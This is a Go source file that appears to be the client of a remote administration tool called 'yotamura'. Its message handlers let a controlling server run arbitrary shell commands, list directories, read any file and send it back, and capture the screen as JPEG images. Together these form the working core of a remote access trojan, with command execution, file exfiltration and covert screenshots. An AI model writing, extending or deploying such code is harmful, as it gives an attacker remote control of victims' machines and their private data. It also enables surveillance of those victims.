package main

import (
	"bytes"
	"fmt"
	"image/jpeg"
	"io"
	"os"
	"yotamura/common"

	"github.com/kbinani/screenshot"
)

func (c *Client) initializeHandlers() {
	c.Actions = make(map[string]func(message common.Message))

	c.Actions["CommandData"] = func(message common.Message) {
		fmt.Println("command")
		var content common.CommandData
		common.DecodeData(message.Data, &content)
		if !content.WaitForOutput {
			ExecBackground(content.Command)
			c.SendJsonMessage(common.CreateMessage(content))
			return
		}
		output, err := Exec(content.Command)
		if err != nil {
			//handle err
		}
		content.Output = string(output)
		c.SendJsonMessage(common.CreateMessage(content))
	}

	c.Actions["DirectoryData"] = func(message common.Message) {
		fmt.Println("file")
		var content common.DirectoryData
		common.DecodeData(message.Data, &content)
		var files []common.File
		osFiles, err := os.ReadDir(content.Path)
		if err != nil {
			//failed to read dir contents
		}
		for _, file := range osFiles {
			files = append(files, common.File{Name: file.Name(), IsDirectory: file.Type().IsDir()})
		}
		fmt.Println(files)
		c.SendJsonMessage(common.CreateMessage(common.DirectoryData{Path: content.Path, Files: files}))
	}
	c.Actions["ReadFileData"] = func(message common.Message) {
		fmt.Println("read")
		var content common.ReadFileData
		common.DecodeData(message.Data, &content)
		output, err := os.ReadFile(content.Path)
		if err != nil {
			//failed to read file
		}
		c.SendJsonMessage(common.CreateMessage(common.ReadFileData{Path: content.Path, Content: output}))
	}
	c.Actions["ScreenshotData"] = func(message common.Message) {
		image, err := screenshot.CaptureDisplay(0)
		if err != nil {
			//failed to capture screenshot
		}
		buf := new(bytes.Buffer)

		resizedImage := common.ResizeImage(image, 1280, 720)
		jpeg.Encode(buf, resizedImage, &jpeg.Options{Quality: 90})

		imageBytes, err := io.ReadAll(buf)
		if err != nil {
			//failed to read all bytes from jpeg
		}

		c.SendJsonMessage(common.CreateMessage(common.ScreenshotData{Screenshot: imageBytes}))
	}
}
